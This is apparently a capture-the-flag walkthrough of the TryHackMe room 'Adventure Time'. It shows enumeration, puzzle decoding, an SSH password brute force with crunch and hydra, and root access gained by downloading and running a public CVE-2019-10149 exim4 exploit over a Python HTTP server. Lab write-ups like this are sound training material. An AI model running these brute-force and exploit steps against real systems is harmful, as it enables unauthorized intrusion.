# [Adventure Time](https://tryhackme.com/room/adventuretime)

## A CTF based challenge to get your blood pumping...

# Adventure Time

## Time to go on an adventure. Do you have what it takes to help Finn and Jake find BMO's reset code? Help solve puzzles and try harder to the max.... This is not a real world challenge, but fun and game only (and maybe learn a thing or two along the way).

### Content of flag1 – format is tryhackme{\*\*\*\*\*\*\*\*\*\*\*\*}

1. We begin our adventure by scanning the target machine to identify open ports and services

```Bash
nmap IP
```

[SCREEN01]

2. Since we have a web server running, let's enumerate directories to find hidden content
   - This scan reveals an interesting path: `/candybar`

```Bash
gobuster dir -u https://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

[SCREEN02]

3. Navigating to `https://IP/candybar` reveals a page with an image
   - Looking at both the image and examining the page source, we discover a encoded string:
   - `KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB2XQ4TQNF2CA5LEM4QHEYLKORUC4===`

[SCREEN03]

4. We can use [CyberChef](https://gchq.github.io/CyberChef/) to decode it
   - First, we identify it as Base32 encoding
   - After Base32 decoding, we apply ROT13 with 11 rotations
   - The decoded message reveals: **Always check the SSL certificate for clues.**

[SCREEN04]

5. Following the hint, we inspect the SSL certificate of the website
   - Click on the lock icon in the browser
   - View the certificate details
   - In the certificate information, we find two additional domain names: `land-of-ooo.com` and `adventure-time.com`

[SCREEN05]

6. To access these domains, we need to add them to the `/etc/hosts` file

[SCREEN06]

7. Now we can enumerate the newly discovered domain `https://land-of-ooo.com/`
   - This reveals a path: `/yellowdog`

```Bash
gobuster dir -u https://land-of-ooo.com -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

[SCREEN07]

8. The `/yellowdog` page doesn't contain useful information, so we continue our enumeration
   - We discover another path: `/bananastock/`

```Bash
gobuster dir -u https://land-of-ooo.com/yellowdog -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

[SCREEN08]

9. In the `/bananastock/` page, we find morse code in both the image and source code
   - `_/..../.\_.../._/_./._/_./._/...\._/._./.\_/..../.\_..././.../_/_._.__/_._.__/_._.__`

[SCREEN09]

10. Using [CyberChef](https://gchq.github.io/CyberChef/) to decode the morse code, we get: **THE BANANAS ARE THE BEST!!!**

[SCREEN10]

11. Let's continue our directory enumeration
    - This reveals `/princess/`

```Bash
gobuster dir -u https://land-of-ooo.com/yellowdog/bananastock -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

[SCREEN11]

12. In the source code of the princess page, we find an encrypted message with decryption parameters

<pre>
  Secrettext = 0008f1a92d287b48dccb5079eac18ad2a0c59c22fbc7827295842f670cdb3cb645de3de794320af132ab341fe0d667a85368d0df5a3b731122ef97299acc3849cc9d8aac8c3acb647483103b5ee44166
  Key = my cool password
  IV = abcdefghijklmanopqrstuvwxyz
  Mode = CBC
  Input = hex
  Output = raw
</pre>

13. Using [CyberChef](https://gchq.github.io/CyberChef/) with AES decryption, we reveal: **the magic safe is accessibel at port 31337. the magic word is: ricardio**

[SCREEN12]

14. Set `netcat` on port `31337`, and provide magic word
    - As result we get **The new username is: apple-guards**

```Bash
nc IP 31337
```

[SCREEN13]

15. Now we can SSH into the target as the newly discovered user
    - Once logged in, we can grab our first flag

```Bash
ssh apple-guards@IP
cat flag1
```

[SCREEN14]

### Content of flag2 – format is tryhackme{\*\*\*\*\*\*\*\*\*\*\*\*}

1. In the `apple-guards` home directory there is also a message from **Marceline**. Let's examine it to find our next lead

```Bash
cat mbox
```

[SCREEN15]

2. The message reveals Marceline has left something for us elsewhere on the system. Let's search for files owned by Marceline
   - We discover a file at `/etc/fonts/helper` owned by Marceline. This is our way forward

```Bash
find / -user marceline -type f 2>/dev/null
/etc/fonts/helper
```

[SCREEN16]

3. When we run the helper program, it presents us with an encrypted message using Vigenère cipher
   - The key needed for decryption is **gone**

[SCREEN17]

4. Solve the quiz

[SCREEN18]

5. Login on Marceline user and get second flag

```Bash
su Marceline
cd /home/marceline
ls -a
cat flag2
```

[SCREEN19]

### Content of flag3 – format is tryhackme{\*\*\*\*\*\*\*\*\*\*\*\*}

1. In **Marceline's** home directory we discover a suspicious file called `I-got-a-secret.txt` containing what appears to be binary data

```Bash
cat I-got-a-secret.txt
```

[SCREEN20]

2. After analyzing the pattern, we realize this isn't standard binary but actually **Spoon binary code**.
   - Using the specialized decoder at [dCode](https://www.dcode.fr/spoon-language), we translate the message
   - Translated message is: **The magic word you are looking for is ApplePie**

[SCREEN21]

3. Similar to our previous discovery with the "ricardio" magic word, let's connect to port `31337` again and use our newly found magic word
   - The system responds with new credentials for a user named **peppermint-butler**

```Bash
nc IP 31337
```

[SCREEN22]

4. With these new credentials, we can either:
   - SSH directly to the machine as peppermint-butler (ssh peppermint-butler@IP)
   - Or switch user if we're already connected as Marceline (su peppermint-butler)
   - Once logged in as peppermint-butler, we navigate to the home directory and locate flag3

```Bash
cd /home/peppermint-butler/
cat flag3
```

[SCREEN23]

### Content of flag4 – format is tryhackme{\*\*\*\*\*\*\*\*\*\*\*\*}

1. As we continue our adventure with the **peppermint-butler** account, we need to transfer an `butler-1.jpg` image file for further analysis
   - Start a simple HTTP server in the directory containing the image
   - Download the file to our local attacking machine

```Bash
python3 -m http.server
```

[SCREEN24]

```Bash
wget http://IP:8000/butler-1.jpg
```

[SCREEN25]

2. Since the image itself doesn't contain obvious clues, let's search for additional files owned by peppermint-butler that might provide context

```Bash
find / -user peppermint-butler -type f 2>/dev/null
```

3. We discover a file at `/usr/share/xml/steg.txt` that appears to contain a password and hint for steganography with steghide

```Bash
cat /usr/share/xml/steg.txt
```

[SCREEN26]

```Bash
steghide extract -sf butler-1.jpg
```

[SCREEN27]

4. Steghide successfully extracted a password-protected zip archive. We need to find the password to extract its contents. Let's look for additional clues

```Bash
cat /etc/php/zip.txt
```

[SCREEN28]

[SCREEN29]

5. We need to create a wordlist with possible password combinations matching the hint

```Bash
crunch 18 18 -t 'The Ice King s@@@@' > file.txt
```

[SCREEN30]

6. Now, we can use hydra to brute force SSH access using the wordlist we created and the username "gunter"
   - The password is **The Ice King sucks**

```Bash
hydra -l gunter -P file.txt ssh://IP
```

7. With these credentials, we can now log in as the gunter user and get flag4

```Bash
ssh gunter@IP
ls -a
cat flag4
```

[SCREEN32]

### Content of flag5 – format is tryhackme{\*\*\*\*\*\*\*\*\*\*\*\*}

1. Now that we've gained access as the gunter user, our goal is to elevate privileges further to the Princess Bubblegum account. Let's begin by identifying potential privilege escalation vectors by searching for SUID binaries (files that execute with the owner's permissions)
   - The results show several SUID binaries, but `/usr/sbin/exim4` stands out as unusual and potentially exploitable. Exim4 is a mail transfer agent (MTA) that typically doesn't need SUID permissions

```Bash
find / -perm -u=s -type f 2>/dev/null
```

[SCREEN33]

2. After researching online, we discover that this specific version of exim4 is vulnerable to CVE-2019-10149, a remote command execution vulnerability. Before exploiting, we need to determine which port exim4 is running on by checking its configuration
   - The configuration file reveals the mail server is running on port 60000

```Bash
cat /etc/exim4/update-exim4.conf.conf
```

[SCREEN34]

3. Let's download an existing exploit from GitHub to leverage this vulnerability. We'll clone the repository on our attacking machine and modify the exploit to target the correct port
   - In the wizard.py file, we need to change the default port from 25 to 60000 to match our target's configuration

```Bash
git clone https://github.com/AzizMea/CVE-2019-10149-privilege-escalation exim4
cd exim4
nano wizard.py
```

[SCREEN35]

4. Now we need to transfer the exploit to the target machine. Let's start a Python HTTP server on our attacking machine to host the exploit file

```Bash
python -m SimpleHTTPServer
```

```Bash
wget http://IP:8000/wizard.py
```

[SCREEN36]
[SCREEN37]

5. Move the wizard.py file to the /tmp directory which typically has execution permissions, and then execute the exploit

```Bash
mv wizard.py /tmp
cd /tmp
python3 wizard.py
```

[SCREEN38]

6. With root access established, we can now navigate to Princess Bubblegum's directory to find the final flag

```Bash
cd /home/bubblegum/
ls
cd Secrets/
ls
cat bmo.txt
```

[SCREEN39]
